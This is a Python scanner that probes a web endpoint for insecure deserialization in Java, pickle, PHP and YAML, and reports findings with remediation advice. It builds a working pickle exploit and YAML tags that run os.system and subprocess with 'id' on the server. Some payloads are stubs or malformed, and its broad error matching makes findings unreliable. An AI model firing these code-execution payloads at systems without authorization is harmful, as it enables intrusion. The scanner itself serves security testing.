#!/usr/bin/env python3
"""
Deserialization Attacks Scanner
Tests for insecure deserialization vulnerabilities across multiple languages
including Java, Python (Pickle), PHP, and YAML
"""

import requests
import json
import base64
from datetime import datetime
from urllib.parse import urlparse

class DeserializationScanner:
    """Scanner for insecure deserialization vulnerabilities"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

    def scan(self):
        """Run deserialization attacks testing"""
        print(f"[*] Starting deserialization attacks testing on {self.target_url}")

        # Test Java deserialization
        self._test_java_deserialization()

        # Test Python pickle
        self._test_python_pickle()

        # Test PHP unserialize
        self._test_php_unserialize()

        # Test YAML deserialization
        self._test_yaml_deserialization()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_java_deserialization(self):
        """Test for Java deserialization vulnerabilities"""
        print("[*] Testing Java deserialization...")

        # Magic bytes for Java serialization
        java_magic = b'\xac\xed\x00\x05'  # Java serialization magic bytes

        # Common gadget chain indicators (simplified for detection)
        # In real attacks, tools like ysoserial would be used
        java_payloads = [
            # Apache Commons Collections payload (simplified)
            (java_magic + b'sr\x00\x17java.util.PriorityQueue', 'Apache Commons Collections'),

            # Spring Framework payload
            (java_magic + b'sr\x00\x1dorg.springframework.', 'Spring Framework'),

            # Groovy payload
            (java_magic + b'sr\x00\x17org.codehaus.groovy.', 'Groovy'),

            # JBoss payload
            (java_magic + b'sr\x00\x0corg.jboss.', 'JBoss'),
        ]

        # Test different parameter names and cookies
        test_locations = [
            ('data', 'POST body'),
            ('serialized', 'Serialized parameter'),
            ('object', 'Object parameter'),
        ]

        for payload, gadget_type in java_payloads:
            # Base64 encode payload (common transport encoding)
            encoded_payload = base64.b64encode(payload).decode()

            for param_name, location in test_locations:
                try:
                    # Test as POST data
                    response = self.session.post(
                        self.target_url,
                        data={param_name: encoded_payload},
                        timeout=10
                    )

                    # Check for deserialization errors
                    java_errors = [
                        'java.io.ObjectInputStream',
                        'ClassNotFoundException',
                        'InvalidClassException',
                        'StreamCorruptedException',
                        'could not deserialize',
                        'deserialization',
                    ]

                    for error in java_errors:
                        if error in response.text:
                            vuln = {
                                'type': 'Java Deserialization Vulnerability',
                                'severity': 'critical',
                                'url': self.target_url,
                                'gadget_type': gadget_type,
                                'parameter': param_name,
                                'evidence': f'Java deserialization error detected: {error}',
                                'description': f'Application deserializes Java objects - {gadget_type} gadget chain may work',
                                'cwe': 'CWE-502',
                                'impact': 'Remote code execution via gadget chains',
                                'remediation': 'Avoid deserializing untrusted data, use allowlists, SerialKiller'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] CRITICAL: Java deserialization found - {gadget_type}")
                            return

                except:
                    pass

    def _test_python_pickle(self):
        """Test for Python pickle deserialization vulnerabilities"""
        print("[*] Testing Python pickle deserialization...")

        # Pickle magic bytes
        pickle_payloads = [
            # Pickle protocol 0-4 markers
            (b'\x80\x03', 'Pickle protocol 3'),
            (b'\x80\x04', 'Pickle protocol 4'),
            (b'c__builtin__', 'Pickle builtin import'),
            (b'cos\nsystem', 'Pickle OS system call'),
        ]

        # Create a simple malicious pickle (detection only, not exploitation)
        try:
            import pickle
            import io

            # Create pickle that would execute code
            class Exploit:
                def __reduce__(self):
                    import os
                    return (os.system, ('id',))

            malicious_pickle = pickle.dumps(Exploit())
            encoded_pickle = base64.b64encode(malicious_pickle).decode()

            test_params = ['data', 'serialized', 'pickle', 'object']

            for param in test_params:
                try:
                    response = self.session.post(
                        self.target_url,
                        data={param: encoded_pickle},
                        timeout=10
                    )

                    # Check for pickle-related errors or RCE indicators
                    pickle_indicators = [
                        'uid=',  # RCE success
                        'pickle',
                        'UnpicklingError',
                        'could not unpickle',
                        'loads',
                        '__reduce__',
                    ]

                    for indicator in pickle_indicators:
                        if indicator in response.text:
                            severity = 'critical' if indicator == 'uid=' else 'high'

                            vuln = {
                                'type': 'Python Pickle Deserialization',
                                'severity': severity,
                                'url': self.target_url,
                                'parameter': param,
                                'evidence': f'Pickle deserialization detected: {indicator}',
                                'description': 'Application deserializes Python pickle objects',
                                'cwe': 'CWE-502',
                                'impact': 'Remote code execution via __reduce__ method',
                                'remediation': 'Never unpickle untrusted data, use JSON instead'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] {severity.upper()}: Python pickle deserialization found")
                            return

                except:
                    pass

        except ImportError:
            pass

    def _test_php_unserialize(self):
        """Test for PHP unserialize vulnerabilities"""
        print("[*] Testing PHP unserialize...")

        # PHP serialized object patterns
        php_payloads = [
            # Object with magic methods
            ('O:8:"stdClass":0:{}', 'PHP stdClass'),

            # Array serialization
            ('a:1:{s:4:"test";s:4:"data";}', 'PHP array'),

            # Object injection attempt
            ('O:4:"Test":1:{s:4:"data";s:7:"payload";}', 'PHP object injection'),

            # POP chain detection payload
            ('O:10:"Filesystem":1:{s:4:"path";s:9:"/etc/passwd";}', 'PHP POP chain'),
        ]

        test_params = ['data', 'serialized', 'object', 'session']

        for payload, description in php_payloads:
            for param in test_params:
                # Also test URL encoded and base64 encoded versions
                encodings = [
                    (payload, 'plain'),
                    (base64.b64encode(payload.encode()).decode(), 'base64'),
                ]

                for encoded_payload, encoding in encodings:
                    try:
                        response = self.session.post(
                            self.target_url,
                            data={param: encoded_payload},
                            timeout=10
                        )

                        # Check for PHP unserialize errors
                        php_errors = [
                            'unserialize()',
                            'Notice: unserialize',
                            'Warning: unserialize',
                            '__wakeup',
                            '__destruct',
                            '__toString',
                            'object injection',
                        ]

                        for error in php_errors:
                            if error in response.text:
                                vuln = {
                                    'type': 'PHP Object Injection',
                                    'severity': 'critical',
                                    'url': self.target_url,
                                    'parameter': param,
                                    'encoding': encoding,
                                    'evidence': f'PHP unserialize detected ({description}): {error}',
                                    'description': 'Application deserializes PHP objects',
                                    'cwe': 'CWE-502',
                                    'impact': 'RCE via POP chains, magic methods exploitation',
                                    'remediation': 'Avoid unserialize() with user input, use JSON'
                                }
                                self.vulnerabilities.append(vuln)
                                print(f"[!] CRITICAL: PHP object injection found - {description}")
                                return

                    except:
                        pass

    def _test_yaml_deserialization(self):
        """Test for YAML deserialization vulnerabilities"""
        print("[*] Testing YAML deserialization...")

        # YAML payloads with unsafe loading
        yaml_payloads = [
            # Python object instantiation
            ('''!!python/object/apply:os.system
args: ['id']''', 'Python object instantiation'),

            # Python object with new
            ('''!!python/object/new:os.system
args: ['id']''', 'Python object new'),

            # Subprocess module
            ('''!!python/object/apply:subprocess.check_output
args: [['id']]''', 'Subprocess execution'),

            # Ruby code execution (if Ruby backend)
            ('''--- !ruby/object:Gem::Installer
i: x
--- !ruby/object:Gem::SpecFetcher
i: y''', 'Ruby object instantiation'),

            # Generic unsafe tag
            ('''!!python/object:__main__.Exploit
command: id''', 'Custom object'),
        ]

        test_params = ['data', 'yaml', 'config', 'settings']
        test_headers = {
            'Content-Type': 'application/x-yaml',
            'User-Agent': 'Mozilla/5.0'
        }

        for payload, description in yaml_payloads:
            for param in test_params:
                try:
                    # Test as POST data
                    response = self.session.post(
                        self.target_url,
                        data={param: payload},
                        headers=test_headers,
                        timeout=10
                    )

                    # Check for YAML loading errors or RCE
                    yaml_indicators = [
                        'uid=',  # RCE success
                        'yaml',
                        'YAMLLoadWarning',
                        'could not determine a constructor',
                        'ConstructorError',
                        'unsafe',
                    ]

                    for indicator in yaml_indicators:
                        if indicator in response.text:
                            severity = 'critical' if indicator == 'uid=' else 'high'

                            vuln = {
                                'type': 'YAML Deserialization Vulnerability',
                                'severity': severity,
                                'url': self.target_url,
                                'parameter': param,
                                'evidence': f'YAML deserialization detected ({description}): {indicator}',
                                'description': 'Application uses unsafe YAML loading',
                                'cwe': 'CWE-502',
                                'impact': 'Remote code execution via unsafe YAML tags',
                                'remediation': 'Use yaml.safe_load() instead of yaml.load()'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] {severity.upper()}: YAML deserialization found - {description}")
                            return

                except:
                    pass

                # Also try as raw body
                try:
                    response = self.session.post(
                        self.target_url,
                        data=payload,
                        headers=test_headers,
                        timeout=10
                    )

                    yaml_indicators = ['uid=', 'yaml', 'YAMLLoadWarning', 'ConstructorError']

                    for indicator in yaml_indicators:
                        if indicator in response.text:
                            severity = 'critical' if indicator == 'uid=' else 'high'

                            vuln = {
                                'type': 'YAML Deserialization Vulnerability',
                                'severity': severity,
                                'url': self.target_url,
                                'evidence': f'YAML deserialization in raw body ({description})',
                                'description': 'Application uses unsafe YAML loading',
                                'cwe': 'CWE-502',
                                'impact': 'Remote code execution',
                                'remediation': 'Use yaml.safe_load()'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] {severity.upper()}: YAML deserialization (raw body)")
                            return

                except:
                    pass

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 deserialization.py <url> [output_file]")
        print("\nExample:")
        print("  python3 deserialization.py https://example.com/api/process")
        print("\nTests for:")
        print("  - Java deserialization (gadget chains)")
        print("  - Python pickle deserialization (__reduce__)")
        print("  - PHP object injection (POP chains)")
        print("  - YAML unsafe loading (!!python/object)")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    scanner = DeserializationScanner(target, output)
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
